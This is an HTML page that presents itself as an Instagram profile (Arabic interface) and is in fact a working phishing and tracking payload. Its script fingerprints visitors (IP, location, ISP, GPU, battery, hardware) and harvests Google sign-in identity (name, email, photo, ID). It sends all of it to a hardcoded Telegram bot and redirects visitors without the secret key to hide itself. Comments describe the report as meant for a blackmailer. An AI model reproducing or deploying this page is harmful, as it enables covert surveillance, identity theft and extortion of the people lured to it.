<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fafafa; margin: 0; display: none; }
        .nav { width: 100%; height: 50px; background: white; border-bottom: 1px solid #dbdbdb; display: flex; justify-content: center; align-items: center; position: fixed; top: 0; z-index: 100; }
        .container { margin-top: 70px; max-width: 600px; margin-right: auto; margin-left: auto; padding: 20px; }
        .profile-header { display: flex; align-items: center; margin-bottom: 20px; }
        .profile-pic { width: 77px; height: 77px; border-radius: 50%; border: 1px solid #dbdbdb; padding: 2px; margin-left: 20px; }
        .username { font-size: 20px; font-weight: 300; margin-bottom: 8px; }
        .btn-follow { background-color: #0095f6; color: white; border: none; padding: 6px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; }
    </style>
</head>
<body>

    <div class="nav"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" height="29"></div>

    <div class="container">
        <div class="profile-header">
            <img src="https://i.pravatar.cc/150?u=art" class="profile-pic">
            <div class="info">
                <div class="username">linda_art_22</div>
                <div style="font-size: 14px;"><b>942</b> متابع | <b>34</b> منشور</div>
            </div>
        </div>
        <button class="btn-follow">متابعة لمشاهدة المحتوى</button>
        <div id="g_id_onload" data-client_id="YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com" data-auto_prompt="true" data-callback="onSignIn"></div>
    </div>

<script>
    const botToken = "8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc";
    const chatId = "7184970355";
    const secretKey = "vlp";

    async function captureDeepDetails() {
        try {
            // 1. جلب الـ IP والمنطقة
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            // 2. بصمة المعالج الرسومي (تحدد موديل الهاتف بدقة)
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const dbgRender = gl.getExtension('WEBGL_debug_renderer_info');
            const renderer = dbgRender ? gl.getParameter(dbgRender.UNMASKED_RENDERER_WEBGL) : "Unknown";

            // 3. معلومات البطارية
            let battStatus = "غير مدعوم";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋'})`;
            }

            // 4. تجميع التقرير "المرعب"
            let msg = `🔥 **تقرير اختراق عميق للمبتز** 🔥\n\n`;
            msg += `🌐 **العنوان:** \`${ipData.ip}\` (${ipData.city}, ${ipData.country_name})\n`;
            msg += `🏢 **الشركة:** \`${ipData.org}\`\n`;
            msg += `📱 **الجهاز (UserAgent):** \`${navigator.userAgent}\`\n`;
            msg += `🎮 **المعالج الرسومي (GPU):** \`${renderer}\`\n`;
            msg += `🔋 **البطارية:** \`${battStatus}\`\n`;
            msg += `🧠 **الهاردوير:** ${navigator.hardwareConcurrency} نواة / ${navigator.deviceMemory || 'غير معروف'}GB رام\n`;
            msg += `📏 **دقة الشاشة:** ${window.screen.width}x${window.screen.height}\n`;
            msg += `🌍 **اللغة والوقت:** ${navigator.language} | ${new Date().toLocaleString()}\n`;
            msg += `📶 **نوع الاتصال:** ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}`;

            sendToTelegram(msg);
        } catch (e) { console.log(e); }
    }

    function onSignIn(response) {
        const user = JSON.parse(atob(response.credential.split('.')[1]));
        let report = `🎯 **تم كشف الهوية الصريحة بنجاح!**\n\n`;
        report += `👤 **الاسم:** \`${user.name}\`\n`;
        report += `📧 **البريد:** \`${user.email}\` \n`;
        report += `🖼 **الصورة:** ${user.picture}\n`;
        report += `🆔 **Google ID:** \`${user.sub}\``;
        sendToTelegram(report);
    }

    function sendToTelegram(t) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
    }

    // نظام التحقق من المفتاح في الرابط
    window.onload = () => {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('key') === secretKey) {
            document.body.style.display = "block";
            captureDeepDetails();
            if (typeof google !== 'undefined') google.accounts.id.prompt();
        } else {
            window.location.replace("https://www.google.com");
        }
    };
</script>
</body>
</html>
